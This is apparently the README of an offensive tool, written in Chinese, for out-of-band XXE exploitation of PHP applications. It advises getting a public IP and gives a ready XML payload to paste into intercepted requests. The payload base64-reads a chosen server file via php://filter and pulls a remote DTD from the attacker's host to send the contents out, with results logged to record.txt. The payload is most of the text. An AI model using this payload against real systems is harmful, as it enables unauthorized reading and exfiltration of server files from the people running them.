# PHP_XXE_FORT
简易的PHP XXE炮台小工具
##建议申请个公网IP，事半功倍
###抓包后改固定内容如下，才能和炮台进行联动

<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../目标数据路径">
<!ENTITY % remote SYSTEM "http://公网IP/fort.xml"> 
%remote;
%send; 
]>

###查看数据请到record.txt中查看




